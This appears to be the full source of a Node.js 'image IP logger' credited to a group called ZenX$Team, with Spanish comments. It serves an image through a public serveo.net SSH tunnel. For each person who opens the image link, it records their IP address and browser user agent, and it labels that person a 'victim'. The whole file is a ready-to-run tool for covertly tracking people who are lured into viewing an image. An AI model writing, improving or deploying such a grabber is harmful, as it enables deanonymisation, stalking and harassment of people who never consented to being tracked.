const { exec } = require('node:child_process');
const express = require('express');
const chalk = require('chalk');
const path = require('node:path');
const app = express();
const port = 80;
const nombre_imagen = "carajoputa.png"; // El nombre del archivo donde está la imagen. ! Ponerlo con extensión.
console.clear();
console.log(chalk.magentaBright(`

     ██▓ ███▄ ▄███▓ ▄▄▄        ▄████ ▓█████     ██▓ ██▓███      ██▓     ▒█████    ▄████   ▄████ ▓█████  ██▀███  
    ▓██▒▓██▒▀█▀ ██▒▒████▄     ██▒ ▀█▒▓█   ▀    ▓██▒▓██░  ██▒   ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
    ▒██▒▓██    ▓██░▒██  ▀█▄  ▒██░▄▄▄░▒███      ▒██▒▓██░ ██▓▒   ▒██░    ▒██░  ██▒▒██░▄▄▄░▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
    ░██░▒██    ▒██ ░██▄▄▄▄██ ░▓█  ██▓▒▓█  ▄    ░██░▒██▄█▓▒ ▒   ▒██░    ▒██   ██░░▓█  ██▓░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
    ░██░▒██▒   ░██▒ ▓█   ▓██▒░▒▓███▀▒░▒████▒   ░██░▒██▒ ░  ░   ░██████▒░ ████▓▒░░▒▓███▀▒░▒▓███▀▒░▒████▒░██▓ ▒██▒
    ░▓  ░ ▒░   ░  ░ ▒▒   ▓▒█░ ░▒   ▒ ░░ ▒░ ░   ░▓  ▒▓▒░ ░  ░   ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
     ▒ ░░  ░      ░  ▒   ▒▒ ░  ░   ░  ░ ░  ░    ▒ ░░▒ ░        ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
     ▒ ░░      ░     ░   ▒   ░ ░   ░    ░       ▒ ░░░            ░ ░   ░ ░ ░ ▒  ░ ░   ░ ░ ░   ░    ░     ░░   ░ 
     ░         ░         ░  ░      ░    ░  ░    ░                  ░  ░    ░ ░        ░       ░    ░  ░   ░     
                                                                                                           
    ~ by ZenX$Team - ${chalk.white(`.gg/kEB3PCPkzc`)}
    `));
async function conectar_serveo() {
    const xd = exec(`ssh -R ${port}:localhost:${port} serveo.net`);
    xd.stdout.on("data", (equisde)=>{
        if(equisde.startsWith('HTTP request from')){
            return;
        };
        const a = equisde.replace("\n", "");
        const b = a.replace("Forwarding HTTP traffic from ", "").trim();
        console.log(`${chalk.cyan(`[$] Host: `)}${chalk.white(`${b}`)}`);
        console.log(`${chalk.cyan(`[$] Image: `)}${chalk.white(`/${nombre_imagen}`)}`)
    });
};
app.get(`/${nombre_imagen}`,(req, res)=>{
    res.sendFile(path.join(__dirname,'', `${nombre_imagen}`));
    console.log(`${chalk.magenta(`[$] Víctima:`)} ${req.headers['x-forwarded-for']} ${chalk.magenta(`-`)} ${req.headers['user-agent']}`);
});
app.listen(port,()=>{
    console.log(`${chalk.cyan(`[i] Se abrió el servidor en el puerto:`)} ${port}`);
    conectar_serveo();
});
